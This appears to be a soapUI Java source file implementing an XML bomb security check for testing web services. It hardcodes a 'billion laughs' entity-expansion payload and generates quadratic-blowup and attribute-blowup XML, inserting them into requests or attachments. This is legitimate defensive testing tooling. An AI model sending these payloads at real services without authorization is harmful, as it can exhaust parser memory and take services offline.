package com.eviware.soapui.security.check;

import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import javax.swing.JCheckBox;
import javax.swing.JComponent;
import javax.swing.JPanel;
import javax.swing.JTextField;
import javax.swing.text.Document;

import org.apache.commons.lang.StringUtils;

import com.eviware.soapui.SoapUI;
import com.eviware.soapui.config.SecurityCheckConfig;
import com.eviware.soapui.config.XmlBombSecurityCheckConfig;
import com.eviware.soapui.impl.support.AbstractHttpRequest;
import com.eviware.soapui.impl.wsdl.testcase.WsdlTestCase;
import com.eviware.soapui.impl.wsdl.testcase.WsdlTestCaseRunner;
import com.eviware.soapui.impl.wsdl.teststeps.WsdlTestRequestStep;
import com.eviware.soapui.model.ModelItem;
import com.eviware.soapui.model.testsuite.SamplerTestStep;
import com.eviware.soapui.model.testsuite.TestStep;
import com.eviware.soapui.model.testsuite.TestRunner.Status;
import com.eviware.soapui.security.SecurityTestRunContext;
import com.eviware.soapui.security.log.SecurityTestLogMessageEntry;
import com.eviware.soapui.security.log.SecurityTestLogModel;
import com.eviware.soapui.support.DocumentListenerAdapter;
import com.eviware.soapui.support.components.SimpleForm;
import com.eviware.soapui.support.types.StringToObjectMap;
import com.eviware.soapui.support.xml.XmlUtils;

public class XmlBombSecurityCheck extends AbstractSecurityCheck implements
		SensitiveInformationCheckable {

	public static final String TYPE = "XmlBombSecurityCheck";
	private static final int MINIMUM_STRING_DISTANCE = 50;
	private static final String DEFAULT_PREFIX = "xmlbomb";
	private static final String ATTACHMENT_PREFIX_FIELD = "Attachment Prefix Field";
	private static final String ENABLE_ATTACHMENT_FIELD = "Send bomb as attachment";

	private int currentIndex = 0;

	public XmlBombSecurityCheck(SecurityCheckConfig config, ModelItem parent,
			String icon) {
		super(config, parent, icon);
		if (config == null) {
			config = SecurityCheckConfig.Factory.newInstance();
			XmlBombSecurityCheckConfig xmlbsc = XmlBombSecurityCheckConfig.Factory
					.newInstance();
			config.setConfig(xmlbsc);
		}
		if (config.getConfig() == null) {
			XmlBombSecurityCheckConfig xmlbsc = XmlBombSecurityCheckConfig.Factory
					.newInstance();
			config.setConfig(xmlbsc);
		}
		if (getAttachmentPrefix() == null)
			setAttachmentPrefix(DEFAULT_PREFIX);

		if (getBombList().size() < 1) {
			getBombList()
					.add(
							"<!DOCTYPE lolz [\n<!ENTITY lol \"lol\">\n<!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n<!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n<!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n<!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n<!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\n<!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n<!ENTITY payload \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n]>");
		}
	}

	@Override
	public void analyze(TestStep testStep, SecurityTestRunContext context,
			SecurityTestLogModel securityTestLog) {
		AbstractHttpRequest<?> lastRequest = getRequest(testStep);

		if (lastRequest.getResponse().getContentAsString().indexOf("SQL Error") > -1) {
			securityTestLog.addEntry(new SecurityTestLogMessageEntry(
					"SQL Error displayed in response", null
			/* new HttpResponseMessageExchange(lastRequest) */));
			setStatus(Status.FAILED);
		} else {
			setStatus(Status.FINISHED);
		}

	}

	@Override
	protected void execute(TestStep testStep, SecurityTestRunContext context,
			SecurityTestLogModel securityTestLog) {

		currentIndex = 0;
		WsdlTestCaseRunner testCaseRunner = new WsdlTestCaseRunner(
				(WsdlTestCase) testStep.getTestCase(), new StringToObjectMap());

		String originalResponse = getOriginalResult(testCaseRunner, testStep)
				.getResponse().getContentAsXml();
		String originalRequest = getRequest(testStep).getRequestContent();
		if (isAttachXmlBomb()) {
			while (currentIndex < getBombList().size() + 1) {
				attachXmlBomb(testStep);
				runCheck(testStep, context, securityTestLog, testCaseRunner,
						originalResponse);
				getRequest(testStep).setRequestContent(originalRequest);
			}

			currentIndex = 0;
		}

		if (getExecutionStrategy().equals(
				SecurityCheckParameterSelector.SEPARATE_REQUEST_STRATEGY)
				&& getParamsToCheck().size() > 0) {
			for (String param : getParamsToCheck()) {
				if (param != null) {
					while (currentIndex < getBombList().size() + 1) {
						generateNextRequest(testStep, param);
						runCheck(testStep, context, securityTestLog,
								testCaseRunner, originalResponse);
						getRequest(testStep).setRequestContent(originalRequest);
					}
				}
			}
		} else if (getParamsToCheck().size() > 0) {
			while (currentIndex < getBombList().size() + 1) {
				generateNextRequest(testStep, getParamsToCheck());
				runCheck(testStep, context, securityTestLog, testCaseRunner,
						originalResponse);
				getRequest(testStep).setRequestContent(originalRequest);
			}
		}

	}

	private void runCheck(TestStep testStep, SecurityTestRunContext context,
			SecurityTestLogModel securityTestLog,
			WsdlTestCaseRunner testCaseRunner, String originalResponse) {
		testStep.run(testCaseRunner, testCaseRunner.getRunContext());
		AbstractHttpRequest<?> lastRequest = getRequest(testStep);

		if (StringUtils.getLevenshteinDistance(originalResponse, lastRequest
				.getResponse().getContentAsString()) > MINIMUM_STRING_DISTANCE) {
			securityTestLog.addEntry(new SecurityTestLogMessageEntry(
					"Possible XML Bomb Vulnerability Detected", null
			/*
			 * new HttpResponseMessageExchange( lastRequest)
			 */));
			setStatus(Status.FAILED);
		}

		analyze(testStep, context, securityTestLog);
	}

	private TestStep generateNextRequest(TestStep testStep,
			List<String> paramsToCheck) {
		AbstractHttpRequest<?> request = getRequest(testStep);
		if (currentIndex < getBombList().size()) {
			String bomb = getBombList().get(currentIndex);

			String requestContent = request.getRequestContent();
			String newRequestContent = requestContent;
			if (testStep instanceof WsdlTestRequestStep) {
				for (String param : paramsToCheck) {
					newRequestContent = XmlUtils.setXPathContent(
							newRequestContent, param.substring(param
									.lastIndexOf("\n") + 1), "&&payload&&");
				}
				newRequestContent = newRequestContent.replaceAll(
						"&amp;&amp;payload&amp;&amp;", "&payload");
			}

			newRequestContent = bomb + newRequestContent;

			request.setRequestContent(newRequestContent);

			currentIndex++;
		} else if (currentIndex == getBombList().size()) {
			request.setRequestContent(createQuadraticExpansionAttack(request
					.getRequestContent(), paramsToCheck));
		}

		return testStep;

	}

	@Override
	public boolean acceptsTestStep(TestStep testStep) {
		return testStep instanceof SamplerTestStep;
	}

	@Override
	public JComponent getComponent() {
		panel = new JPanel(new BorderLayout());

		form = new SimpleForm();
		form.addSpace(5);

		JTextField attachmentPrefixField = form.appendTextField(
				ATTACHMENT_PREFIX_FIELD, "Attachment Prefix Field");
		attachmentPrefixField.setMaximumSize(new Dimension(80, 10));
		attachmentPrefixField.setColumns(20);
		attachmentPrefixField.setText(getAttachmentPrefix());
		attachmentPrefixField.setEnabled(isAttachXmlBomb());
		attachmentPrefixField.getDocument().addDocumentListener(
				new DocumentListenerAdapter() {

					@Override
					public void update(Document document) {
						String prefix = form
								.getComponentValue(ATTACHMENT_PREFIX_FIELD);

						setAttachmentPrefix(prefix);
					}
				});

		JCheckBox attachXml = form.appendCheckBox(ENABLE_ATTACHMENT_FIELD,
				null, isAttachXmlBomb());
		attachXml.addItemListener(new ItemListener() {
			public void itemStateChanged(ItemEvent arg0) {
				setAttachXmlBomb(((JCheckBox) form
						.getComponent(ENABLE_ATTACHMENT_FIELD)).isSelected());
				form.getComponent(ATTACHMENT_PREFIX_FIELD).setEnabled(
						isAttachXmlBomb());
			}
		});

		panel.add(form.getPanel());
		return panel;
	}

	@Override
	public String getType() {
		return TYPE;
	}

	@Override
	public void checkForSensitiveInformationExposure(TestStep testStep,
			SecurityTestRunContext context, SecurityTestLogModel securityTestLog) {
		InformationExposureCheck iec = new InformationExposureCheck(config,
				null, null);
		iec.analyze(testStep, context, securityTestLog);

	}

	public boolean isAttachXmlBomb() {
		return ((XmlBombSecurityCheckConfig) config.getConfig())
				.getAttachXmlBomb();
	}

	public void setAttachXmlBomb(boolean attach) {
		((XmlBombSecurityCheckConfig) config.getConfig())
				.setAttachXmlBomb(attach);
	}

	private TestStep generateNextRequest(TestStep testStep, String param) {
		AbstractHttpRequest<?> request = getRequest(testStep);

		if (currentIndex < getBombList().size()) {
			String bomb = getBombList().get(currentIndex);

			String requestContent = request.getRequestContent();
			String newRequestContent = requestContent;
			if (testStep instanceof WsdlTestRequestStep) {
				newRequestContent = XmlUtils.setXPathContent(request
						.getRequestContent(), param.substring(param
						.lastIndexOf("\n") + 1), "&&payload&&");
				// We need to do this, since the parser we are using does not
				// provide support for
				// entity references (it throws a "Not Implemented" runtime
				// exception when trying to create one
				newRequestContent = newRequestContent.replaceAll(
						"&amp;&amp;payload&amp;&amp;", "&payload;");
			}

			newRequestContent = bomb + newRequestContent;
			// This is a bit of a hack, since the xpath functionality above
			// strips the DTD if it is run
			// after the DTD is added.
			request.setRequestContent(newRequestContent);

		} else if (currentIndex == getBombList().size()) {
			List<String> paramList = new ArrayList<String>();
			paramList.add(param);
			request.setRequestContent(createQuadraticExpansionAttack(request
					.getRequestContent(), paramList));
		}

		currentIndex++;

		return testStep;
	}

	private TestStep attachXmlBomb(TestStep testStep) {
		if (isAttachXmlBomb()) {
			AbstractHttpRequest<?> request = getRequest(testStep);

			if (currentIndex < getBombList().size()) {
				String bomb = getBombList().get(currentIndex);
				try {
					File bombFile = File.createTempFile(getAttachmentPrefix(),
							".xml");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							bombFile));
					writer.write(bomb);
					writer.write("<payload>&payload;</payload>");
					writer.flush();
					request.attachFile(bombFile, false);
					bombFile.delete();
					currentIndex++;
				} catch (IOException e) {
					SoapUI.logError(e);
				}
			} else if (currentIndex == getBombList().size()) {
				try {
					File bombFile = File.createTempFile(getAttachmentPrefix(),
							".xml");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							bombFile));
					writer.write(createQuadraticExpansionAttack(null, null));
					writer.flush();
					request.attachFile(bombFile, false);
					bombFile.delete();
				} catch (IOException e) {
					SoapUI.logError(e);
				}
				currentIndex++;
			} else if (currentIndex == getBombList().size() + 1) {
				try {
					File bombFile = File.createTempFile(getAttachmentPrefix(),
							".xml");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							bombFile));
					writer.write(createAttributeBlowupAttack(null, null));
					writer.flush();
					request.attachFile(bombFile, false);
					bombFile.delete();
				} catch (IOException e) {
					SoapUI.logError(e);
				}
				currentIndex++;
			}
		}
		return testStep;
	}

	protected List<String> getBombList() {
		return ((XmlBombSecurityCheckConfig) config.getConfig())
				.getXmlBombsList();
	}

	protected void setBombList(List<String> bombList) {
		((XmlBombSecurityCheckConfig) config.getConfig())
				.setXmlBombsArray(bombList.toArray(new String[1]));
	}

	protected List<String> getExternalDTDList() {
		return ((XmlBombSecurityCheckConfig) config.getConfig())
				.getExternalDTDList();
	}

	protected void setExternalDTDList(List<String> dtdList) {
		((XmlBombSecurityCheckConfig) config.getConfig())
				.setExternalDTDArray(dtdList.toArray(new String[1]));
	}

	protected String getAttachmentPrefix() {
		return ((XmlBombSecurityCheckConfig) config.getConfig())
				.getXmlAttachmentPrefix();
	}

	protected void setAttachmentPrefix(String prefix) {
		((XmlBombSecurityCheckConfig) config.getConfig())
				.setXmlAttachmentPrefix(prefix);
	}

	private String createQuadraticExpansionAttack(String initialContent,
			List<String> params) {
		String result = "";

		StringBuilder entityContent = new StringBuilder("a");
		StringBuilder entityReferences = new StringBuilder("&a;");


		if (initialContent != null) {
			for (String param : params) {
				initialContent = XmlUtils.setXPathContent(initialContent, param
						.substring(param.lastIndexOf("\n") + 1), "&&payload&&");
			}
			for (int i = 0; i < 16; i++) {
				entityContent.append(entityContent.toString());
				entityReferences.append(entityReferences.toString());
			}
			initialContent = initialContent.replaceAll(
					"&amp;&amp;payload&amp;&amp;", entityReferences.toString());
		} else {
			for (int i = 0; i < 16; i++) {
				entityContent.append(entityContent.toString());
				entityReferences.append(entityReferences.toString());
			}
			initialContent = "<kaboom>" + entityReferences + "</kaboom>";
		}

		result = "<!DOCTYPE kaboom [\n<!ENTITY a \"" + entityContent.toString()
				+ "\">\n]>" + initialContent;

		return result;
	}

	private String createAttributeBlowupAttack(String initialContent,
			List<String> params) {
		String result = "";

		result = "<kaboom ";

		for (int i = 0; i < 200000; i++) {
			result = result + " att" + i + "='test' ";
		}

		result += "/>";

		return result;
	}

}
